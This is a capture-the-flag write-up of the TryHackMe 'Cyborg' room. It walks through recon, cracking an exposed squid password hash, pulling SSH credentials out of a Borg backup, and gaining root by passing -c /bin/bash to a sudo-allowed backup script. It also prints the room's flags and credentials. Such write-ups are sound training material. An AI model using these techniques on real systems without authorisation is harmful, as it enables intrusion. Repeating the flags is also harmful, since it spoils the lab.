---
title: "Cyborg"
---

:::info Description

These are my notes for the [Cyborg Room](https://tryhackme.com/room/cyborgt8) on TryHackMe.

Note: Task #1 is to deploy the machine.

|OS|Level|Rating
|:---:|:-----:|:-----:|
|Windows|Easy|5/5|

:::

## RECON

### Nmap

From scan `nmap -v -sV -p- -o nmap-cyborg.txt 10.10.148.181`

I found:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Gobuster

results (didnt note the command):

```bash
http://10.10.19.193/.hta                 (Status: 403) [Size: 277]
http://10.10.19.193/.htaccess            (Status: 403) [Size: 277]
http://10.10.19.193/.htpasswd            (Status: 403) [Size: 277]
http://10.10.19.193/admin                (Status: 301) [Size: 312] [--> http://10.10.19.193/admin/]
http://10.10.19.193/etc                  (Status: 301) [Size: 310] [--> http://10.10.19.193/etc/]
http://10.10.19.193/index.html           (Status: 200) [Size: 11321]
http://10.10.19.193/server-status        (Status: 403) [Size: 277]
```

I browse to `http://10.10.19.193/etc/squid/passwd` and find `music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`

Let's crack it.

## Crack

```bash
└─$ john passwd --wordlist=/usr/share/wordlists/rockyou.txt                                                  130 ⨯ 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"                       
Use the "--format=md5crypt-long" option to force loading these as that type instead                                
Using default input encoding: UTF-8                                                                                
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])                               
Will run 2 OpenMP threads                                                                                          
Press 'q' or Ctrl-C to abort, almost any other key for status                                                      
squidward        (music_archive)                                                                                   
1g 0:00:00:01 DONE (2022-01-15 23:24) 0.6711g/s 26158p/s 26158c/s 26158C/s wonderfull..samantha5                   
Use the "--show" option to display all of the cracked passwords reliably                                           
Session completed
```

We have user/password = `music_archive/squidward`

## Enumerate web folders

I found `squid.conf`:

```bash
# http://10.10.19.193/etc/squid/squid.conf

auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

### archive.tar

I found archive on `view-source:http://10.10.148.181/admin/index.html` = `http://10.10.148.181/admin/archive.tar`

downloaded & extracted - contains a BORG archive.

might come in handy later:

```sh
└─$ strings integrity.5 
version
hints
@{"algorithm": "XXH64", "digests": {"final": "05178884e81563d7"}}
index
b{"algorithm": "XXH64", "digests": {"HashHeader": "146e9cb969e480a3", "final": "b53737af67235823"}}
```

config file

```sh
[repository]
version = 1
segments_per_dir = 1000
max_segment_size = 524288000
append_only = 0
storage_quota = 0
additional_free_space = 0
id = ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31
key = hqlhbGdvcml0aG2mc2hhMjU2pGRhdGHaAZ6ZS3pOjzX7NiYkZMTEyECo+6f9mTsiO9ZWFV
        L/2KvB2UL9wHUa9nVV55aAMhyYRarsQWQZwjqhT0MedUEGWP+FQXlFJiCpm4n3myNgHWKj
        2/y/khvv50yC3gFIdgoEXY5RxVCXhZBtROCwthh6sc3m4Z6VsebTxY6xYOIp582HrINXzN
        8NZWZ0cQZCFxwkT1AOENIljk/8gryggZl6HaNq+kPxjP8Muz/hm39ZQgkO0Dc7D3YVwLhX
        daw9tQWil480pG5d6PHiL1yGdRn8+KUca82qhutWmoW1nyupSJxPDnSFY+/4u5UaoenPgx
        oDLeJ7BBxUVsP1t25NUxMWCfmFakNlmLlYVUVwE+60y84QUmG+ufo5arj+JhMYptMK2lyN
        eyUMQWcKX0fqUjC+m1qncyOs98q5VmTeUwYU6A7swuegzMxl9iqZ1YpRtNhuS4A5z9H0mb
        T8puAPzLDC1G33npkBeIFYIrzwDBgXvCUqRHY6+PCxlngzz/QZyVvRMvQjp4KC0Focrkwl
        vi3rft2Mh/m7mUdmEejnKc5vRNCkaGFzaNoAICDoAxLOsEXy6xetV9yq+BzKRersnWC16h
        SuQq4smlLgqml0ZXJhdGlvbnPOAAGGoKRzYWx02gAgzFQioCyKKfXqR5j3WKqwp+RM0Zld
        UCH8bjZLfc1GFsundmVyc2lvbgE=
```

## Borg Backup System

the tar is a borg deduplication file/archive [borg](https://borgbackup.readthedocs.io/en/stable/index.html).

the [usage](https://borgbackup.readthedocs.io/en/stable/usage/general.html) is e.g. `borg list /path/to/archive`

for the archive.tar with `/home/field/dev` the actual "archive" is the folder `final_archive`:

use the passwd we cracked `squidward`:

```bash
┌──(kali㉿kali)-[~/…/download/home/field/dev]
└─$ borg list ./final_archive 
Enter passphrase for key /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/CYBORG/download/home/field/dev/final_archive: 
music_archive                        Wed, 2020-12-30 03:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```

so will try and extract it, see any info in it.

## PRIVESC

### user.txt

mounted archive using `borg mount ./final_archive /tmp/borg`, mounts the FUSE filesystem archive at `/tmp/borg` and was the users whole home dir backup. had a look around and found `Document\note.txt` which had:

```bash
└─$ cat Documents/note.txt
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

use it to `ssh alex@10.10.148.181` and got the `user.txt` flag.

```bash
alex@ubuntu:~$ cat user.txt 
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

### root.txt

check what alex can do with `sudo`:

```bash
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

looking through the `/etc/mp3backups/backup.sh` and this part looks the most interesting because it's allowing a command to be injected in here, running as root :D

```bash
#!/bin/bash

...

while getopts c: flag
do
  case "${flag}" in 
    c) command=${OPTARG};;
  esac
done

...

```

This [page](https://www.howtogeek.com/778410/how-to-use-getopts-to-parse-linux-shell-script-options/) explains how `getopts` works by letting you set the characters used to trigger the cases.

I try adding a `-c /bin/bash` to the backup script:

```bash
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c /bin/bash
/home/alex/Music/image12.mp3
/home/alex/Music/image7.mp3
/home/alex/Music/image1.mp3
/home/alex/Music/image10.mp3
/home/alex/Music/image5.mp3
/home/alex/Music/image4.mp3
/home/alex/Music/image3.mp3
/home/alex/Music/image6.mp3
/home/alex/Music/image8.mp3
/home/alex/Music/image9.mp3
/home/alex/Music/image11.mp3
/home/alex/Music/image2.mp3
find: ‘/run/user/108/gvfs’: Permission denied
Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz

tar: Removing leading `/' from member names
tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
tar: Exiting with failure status due to previous errors

Backup finished
root@ubuntu:~# 
```

because this spawns a shell halfway through the script, the output will be going to some other output, so we don't see the results until I exit out of the shell:

```bash
root@ubuntu:~# id; whoami; cat /root/root.txt
root@ubuntu:~# exit
uid=0(root) gid=0(root) groups=0(root) root flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```
